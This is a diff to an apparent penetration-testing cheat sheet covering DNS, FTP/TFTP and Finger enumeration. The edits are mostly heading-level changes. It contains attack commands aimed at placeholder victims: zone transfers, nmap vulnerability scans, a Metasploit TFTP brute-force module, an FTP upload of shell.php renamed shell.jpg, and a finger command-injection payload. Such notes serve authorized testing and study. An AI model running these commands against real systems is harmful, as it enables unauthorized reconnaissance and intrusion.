@@ -151,46 +151,46 @@ Buckets are used to store objects, which consist of data and metadata that descr
 --------------------------------------------------------------------------------------------------------------------------------
 # DNS
 
-## Interacting with a DNS Server
+### Interacting with a DNS Server
 ```
 - host -t ns [victim_domain]
 - host -t mx [victim_domain]
 ```
 
-## DNS_lookup
-# TODO
+### DNS_lookup
+## TODO
 
-## Reverse_DNS_lookup
-# TODO
+### Reverse_DNS_lookup
+## TODO
 
-## nslookup
+### nslookup
 ```
 nslookup
   SERVER [victim_ip]
   [victim_ip]
 ````
 
-## Dig_zone_transfer
+### Dig_zone_transfer
 ```
 dig axfr [victim_servername] @victim-ip
 ```
 
-## fierce
+### fierce
 ```
 fierce -dns [victim_domain]
 ```
 
-## DNSrecon
+### DNSrecon
 ```
 dnsrecon -d [victim_scan] -t axfr
 ```
 
-## DNSEnum
+### DNSEnum
 ```
 dnsenum [victim_scan]
 ```
 
-## Zone_transfer_description
+### Zone_transfer_description
 Zone file is a file on server contains entries for different Resource Records(RR). These records can provide us a bunch of information about the domain. Each zone file must start with a Start of Authority (SOA) record containing an authoritative nameserver for the domain (for e.g. ns1.google.com for google.com ) and an email address of someone responsible for the management of the nameserver.
 Types of Resource Records:
 NS Recors: use the given authoritative nameserver
@@ -202,7 +202,7 @@ A Records: Give us IP-address for a particular domain
 --------------------------------------------------------------------------------------------------------------------------------
 # FTP/TFTP
 
-## nmap_ftp_scan:
+### nmap_ftp_scan:
 - nmap -p 21 -sV [victim_ip]
 - nmap -sV -sC [victim_ip] -p 21
 - namp --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum,ftp-default,ftp-user-enum -p [victim_ip]
@@ -210,11 +210,11 @@ A Records: Give us IP-address for a particular domain
 - nmap -sU -p 69 --script tftp-enum.nse [victim_ip]
 - nmap -oN tftp.nmap -v -sU -sV -T2 –script tftp* -p 69 [victim_ip]
 
-## metasploit_tftp
+### metasploit_tftp
 ```
 use auxiliary/scanner/tftp/tftpbrute
 ```
-## Upload_attemps
+### Upload_attemps
 ```
 ftp> put shell.php shell.jpg
 ftp> PUT shell.php shell.jpg
@@ -222,13 +222,13 @@ ftp> send
   (local-file) shell.php
   (remote-file) shell.jpg
 ```
-## path_traversal
+### path_traversal
 ```
 dir ../
 ls ../
 ```
 
-## Windows_dir_change_with_~1
+### Windows_dir_change_with_~1
 ```
 cd /Docume~1/
 cd /Progra~1/
@@ -236,15 +236,13 @@ cd /Progra~1/
 --------------------------------------------------------------------------------------------------------------------------------
 # Finger
 
-## enumeration_script
+### enumeration_script
 - https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl
 
-## finger_comandline 
+### finger_comandline 
 ```
 finger [username]@[ip]
-```
-##
-```
+
 finger "|/bin/ls -a /@[victim_ip]"
 ```
 --------------------------------------------------------------------------------------------------------------------------------
